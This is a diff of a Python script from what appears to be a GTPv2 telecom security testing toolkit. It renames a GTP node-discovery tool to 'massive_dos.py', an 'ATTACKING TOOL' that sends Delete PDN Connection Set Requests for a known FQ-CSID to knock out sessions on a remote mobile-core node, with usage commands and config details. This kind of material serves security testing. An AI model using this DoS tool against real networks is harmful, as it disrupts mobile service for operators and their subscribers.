@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # encoding: utf-8
-#      discover_gtp_nodes.py
+#       massive_dos.py
 #       
 #       Copyright 2018 Rosalia d'Alessandro 
 #                     
@@ -32,46 +32,44 @@
 #       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 #       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 #
-
 import os
 import sys
 from optparse import OptionParser
 from gtp_v2_core.utilities.configuration_parser import parseConfigs
-
 from commons.message_handler import MessageHandler
-
 from commons.globals import message_queue
-
 
 __all__ = []
 __version__ = 0.1
 
+
+GTP_PORT = 2123
 DEFAULT_MSG_FREQ = 20
 DEFAULT_SLEEPTIME = 1
 DEBUG = 0
+
 
 ##
 ## ATTACKING TOOL 
 ## 
 ## @brief      Main file to execute the script.
 ## 
-## This file can discover gtp nodes sending several messages like:
-## - echo requests
-## - create session request
-## - delete session request with random TEIDs or TEID set to zero
-## ¯ delete bearer request  
+## This file can test a DoS attack sending a Delete PDN Connection Set Request 
+## (101) for a specific FQ-CSID.FQ-CSID is calculated using node type id, mcc, mnc and source ip 
+## provided in the config file.
+## 
 ## Use the -h option to enter the help menu and determine what to do.
 ## 
 ## Basic usage examples:
-##      * $ python discover_gtp_nodes.py -v -c conf_file.cnf [-c conf2.cnf ...] 
-##        -r <remote ip> 
-#         act as a client connecting to <remote-host-ip>
+##      * $ python massive_dos.py -v -c conf_file.cnf [-c conf2.cnf ...] -r <remote ip> 
+#            act as a client connecting to <remote-host-ip>
 ##      
-##      * $ python discover_gtp_nodes.py -lv  -c conf_file.cnf [-c conf2.cnf ...] 
-##        -r <remote ip>      
-##        act as a server listening on 0.0.0.0 and accepting replies from 
-##        <remote-host-ip>
-## Example configuration file: EchoRequest.cnf, DeleteSession.cnf, DeleteBearer.cnf
+##      * $ python massive_dos.py -lv  -c conf_file.cnf [-c conf2.cnf ...] -r <remote ip>
+##      
+##           act as a server listening on 0.0.0.0 and accepting replies from <remote-host-ip>
+##
+## Example configuration file: MassiveDos.cnf
+## Pre-conditions: known valid FQ-CSID
 
 def main(argv=None):
     '''Command line options.'''
@@ -100,14 +98,13 @@ def main(argv=None):
                           action = "count", help = "start also a GTP_C listener")       
         
         # set defaults
-        parser.set_defaults(listening_mode=False, 
-                            config_file="../config/GTPNodesDiscovery.cnf", 
-                            verbose = 0)
+        parser.set_defaults(listening_mode=False,
+                            config_file="../config/MassiveDoS.cnf", 
+                            verbose = False)
 
         # process options
         (opts, args) = parser.parse_args(argv)
-        is_verbose = opts.verbose
-        
+        is_verbose = False
         listening_mode = opts.listening_mode
           
 
@@ -126,33 +123,18 @@ def main(argv=None):
         config = parseConfigs(opts.config_file)
  
         msgs = config.get_unpacked_messages()
-        port = config.get_gtp_port()
-        
+       
         lstn = MessageHandler(messages = msgs, peer = remote_net, 
                               isVerbose = is_verbose, 
                               listening_mode = listening_mode,
-                              msgs_freq = msg_freq, wait_time = sleep_time,
-                              port = port)  
+                              msgs_freq = msg_freq, wait_time = sleep_time)  
         if lstn : 
             lstn.daemon = True
             lstn.start()
             lstn.join()
             lstn.stop()
-        print "Sent %d GTPV%d messages"%(len(message_queue), config.get_version())
-        if not listening_mode :
-            return
-        count = 0
-        for key, value in message_queue.items():
-            for k,v in value.items():               
-                for i in v :
-                    if i['reply'] == 1:
-                        print "%s implements a GTP v2 stack"%key
-                        count += 1
-                        break
-        if count > 0 :
-            print "Found in total %d targets implemeting a GTP v2 stack"%count
-        else :
-            print "Not found targets implemeting a GTP v2 stack"        
+        print "Sent %d GTPV2 messages"%len(message_queue)
+       
     except Exception, e:
         indent = len(program_name) * " "
         sys.stderr.write(program_name + ": " + repr(e) + "\n")
